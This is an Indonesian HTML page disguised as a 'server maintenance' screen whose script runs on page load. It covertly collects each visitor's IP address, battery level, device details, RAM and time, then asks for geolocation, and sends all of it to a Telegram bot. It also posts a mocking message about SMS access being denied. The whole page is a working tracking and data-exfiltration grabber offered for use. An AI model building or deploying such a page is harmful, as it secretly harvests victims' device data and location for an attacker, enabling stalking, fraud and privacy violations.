<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Maintenance</title>
    <style>
        body {
            margin: 0; padding: 0; display: flex; justify-content: center;
            align-items: center; height: 100vh; background-color: #000000;
            font-family: 'Segoe UI', sans-serif; color: #008cff;
        }
        .container { text-align: center; }
        h1 { font-size: 2.2rem; text-transform: uppercase; text-shadow: 0 0 15px #008cff; margin-bottom: 10px; }
        .status { color: #005bb5; font-size: 1.1rem; }
        .loader { border: 3px solid #111; border-top: 3px solid #008cff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <h1>Server Sedang Maintenance</h1>
        <p class="status">Menyinkronkan perangkat, tunggu sebentar...</p>
        <div class="loader"></div>
    </div>

    <script>
        // --- KONFIGURASI BOT TELEGRAM ---
        const TELEGRAM_TOKEN = "GANTI_TOKEN_BOT";
        const CHAT_ID = "GANTI_CHAT_ID";

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) { return "Tidak terdeteksi"; }
        }

        async function getBattery() {
            try {
                const battery = await navigator.getBattery();
                return `${Math.round(battery.level * 100)}%`;
            } catch (e) { return "Tidak didukung"; }
        }

        async function sendVisitorInfo() {
            const ip = await getIP();
            const battery = await getBattery();
            const device = navigator.userAgent.split('(')[1].split(')')[0];
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak terdeteksi";
            const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

            const pesan = `📥 Info Pengunjung (Auto):

📱 Device: ${device}
🌐 IP: ${ip}
🔋 Baterai: ${battery}
🕒 Waktu: ${waktu}
Ram handphone: ${ram}`;

            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
                });

                // Setelah info terkirim, jalankan alur lokasi & log SMS
                startSubProcess();
            } catch (e) { console.error("Gagal kirim info"); }
        }

        async function startSubProcess() {
            // Izin Lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (p) => {
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 Lokasi: ${p.coords.latitude}, ${p.coords.longitude}` })
                        });
                    }
                );
            }
            // Log SMS sesuai instruksi sebelumnya
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: "izin akses SMS ditolak 😹" })
            });
        }

        window.onload = sendVisitorInfo;
    </script>
</body>
</html>
